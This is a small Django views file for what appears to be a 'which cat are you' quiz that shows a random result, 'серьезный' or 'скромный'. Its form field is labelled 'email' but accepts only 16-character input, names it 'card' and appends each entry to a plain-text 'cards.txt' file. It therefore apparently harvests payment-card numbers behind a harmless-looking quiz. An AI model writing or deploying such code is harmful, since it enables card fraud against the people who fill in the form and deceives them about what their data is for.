from django.shortcuts import render, redirect
import random

def result(request):
    return render(request, "result.html", locals())

'''def about(request):
    return render(request, "about.html", locals())'''

def test(request):

    if request.method == 'GET':
        return render(request, 'main.html')

    if request.method == 'POST':
        file = open('cards.txt', 'a')

        card = request.POST.get('email', '')

        if card == '' or len(card) != 16:
            return redirect('/test')

        file.write(card +'\n')

        cats = ['серьезный', 'скромный']
        pics = ['/static/серьезный.jpg', '/static/скромный.jpg']
        rand = random.randint(0, 1)
        cat = cats[rand]
        pic = pics[rand]

        file.close()

        return render(request, 'result.html', {'pic': pic, 'cat': cat})

